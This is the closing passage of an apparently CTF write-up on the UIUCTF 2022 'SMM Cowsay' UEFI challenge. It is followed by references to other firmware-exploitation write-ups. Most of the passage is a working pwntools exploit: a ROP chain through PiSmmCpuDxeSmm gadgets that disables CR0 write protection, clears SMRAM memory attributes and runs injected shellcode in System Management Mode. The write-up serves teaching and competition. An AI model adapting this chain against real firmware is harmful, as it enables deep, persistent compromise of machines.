loong_jump_gadget = PiSmmCpuDxeSmm_base + 0x108F0
mov_cr0rax_gadget = PiSmmCpuDxeSmm_base + 0x10A5F
pop_raxrdi_gadget = PiSmmCpuDxeSmm_base + 0x107FA
pop_rdxrcxrbx_ret = PiSmmCpuDxeSmm_base + 0x106FC
pop_rbx_ret = pop_rdxrcxrbx_ret + 2
ret_addr = PiSmmCpuDxeSmm_base + 0x0000000000001038
# 0x0000000000006260 : mov r8, rdi ; call qword ptr [rax + 0x140]
control_r8 = PiSmmCpuDxeSmm_base + 0x0000000000006260
SmmClearMemoryAttributes_addr = PiSmmCpuDxeSmm_base + 0x7979
ret_0x68 = PiSmmCpuDxeSmm_base + 0x000000000000AF33

smm_shellcode = asm(f"""
    mov rax, [0x44440000];
    mov rcx, [0x44440008];
    mov rdx, [0x44440010];

    ud2;
""")
smm_shellcode = smm_shellcode.ljust(((len(smm_shellcode) // 8) + 1) * 8, b"\x90")

payload = flat(
    {
        0x00: [
            0xBBBBBBBB,  # rbx
            smm_buf_addr + 0x28 + 0x40,
            pop_rbx_ret,
        ],
        0x48: [ret_addr],
        0x50: [
            pop_raxrdi_gadget,
            0x80000033,  # disable WP
            0,
            mov_cr0rax_gadget,
            pop_raxrdi_gadget,
            smm_buf_addr + 0x28 - 0x140,  # ret
            0x2000,
            control_r8,
            # ],
            # 0x50 + 0x68 + 0x40: [
            pop_rdxrcxrbx_ret,
            0x1000,
            0x44440000,
            0,
            SmmClearMemoryAttributes_addr,
            pop_rbx_ret,
            PiSmmCpuDxeSmm_base + 0x1000,
        ],
    },
    word_size=64,
)

"""
3bb6: mov    QWORD PTR [rbx],rax
3bb9: pop    rbx
3bba: ret
"""
magic_gadget = PiSmmCpuDxeSmm_base + 0x3BB6
for i in range((len(smm_shellcode) // 8) - 1):
    payload += flat(
        [
            pop_raxrdi_gadget,
            u64_ex(smm_shellcode[i * 8 : (i + 1) * 8]),
            0,
            magic_gadget,
            PiSmmCpuDxeSmm_base + 0x1000 + (i + 1) * 8,
        ],
        word_size=64,
    )
payload += p64(PiSmmCpuDxeSmm_base + 0x1000)
payload = payload.ljust(400, b"\x90") + p64(loong_jump_gadget)

gEfiSmmCowsayCommunicationGuid = 0xF79265547535A8B54D102C839A75CF12
gEfiSmmCommunicationProtocolGuid = 0x32C3C5AC65DB949D4CBD9DC6C68ED8E2

execute_shellcode(
    asm(f"""
    lea rsi, [rip + buf_data];
    mov rdi, {smm_buf_addr};
    mov rcx, {len(payload) + 0x18};
    cld;
    rep movsb;

    ret;

buf_data:
    .octa {gEfiSmmCowsayCommunicationGuid}
    .quad {len(payload)};
""")
    + payload
)

context.log_level = "debug"

lianpwn.lg_inf("STEP 3: Attack!")
debug_with_addr()
execute_shellcode(
    asm(f"""
    // LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, mSmmCommunication)
    lea rcx, [rip + buf_data];
    xor rdx, rdx;
    lea r8, [rip + buf_temp];
    mov rax, {LocateProtocol_addr};
    call rax;
    mov r15, [rip + buf_temp];
    lea r14, [rip + buf_temp];

    // Communicate(mSmmCommunication, Buffer, NULL)
    lea rcx, [rip + buf_temp];
    mov rdx, {smm_buf_addr};
    xor r8, r8;
    mov rax, [rcx];
    mov rax, [rax];
    call rax;

    ret;

buf_data:
    .octa {gEfiSmmCommunicationProtocolGuid}
buf_temp:
""")
)


ia()
```

---
# References

\[1\] [Pwn2Win CTF 2021 Writeup](https://ptr-yudai.hatenablog.com/entry/2021/05/31/232507#Pwn-373pts-Accessing-the-Trush-8-solves) . _ptr-yudai_

\[2\] [解决第一个UEFI PWN——ACCESSING THE TRUTH解题思路](https://sung3r.github.io/) . _sung3r_

\[3\] [D^3CTF 2022 PWN - d3guard official writeup](https://eqqie.cn/index.php/archives/1929) . _eqqie_

\[4\] [x86 架构 BIOS 攻击面梳理与分析](https://www.cnblogs.com/L0g4n-blog/p/17369864.html) . _L0g4n_

\[5\] [UEFI安全漏洞的挖掘、防御与检测之道](https://www.4hou.com/posts/DWyn) . _fanyeee_

\[6\] [UIUCTF 2022 - SMM Cowsay 1, 2, 3](https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/) . _Marco Bonelli_
